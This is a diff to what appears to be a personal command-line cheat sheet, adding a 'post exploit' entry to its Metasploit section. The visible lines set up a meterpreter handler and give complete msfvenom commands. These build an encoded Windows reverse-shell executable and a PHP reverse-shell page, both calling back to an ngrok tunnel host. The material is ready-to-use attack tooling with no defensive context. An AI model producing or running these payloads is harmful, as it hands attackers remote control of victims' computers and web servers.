@@ -1332,6 +1332,8 @@ bash/zsh + linux terminal cli tools commands
         - set handler: use exploit/multi/handler
         - php: set payload php/meterpreter/reverse_tcp
         - exploit: exploit -j
+        - post exploit:
+            - edit myfile
 - msfvenom:
     - windows: msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 25 LHOST=0.tcp.ngrok.io LPORT=12345 -f exe > 1.exe
     - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
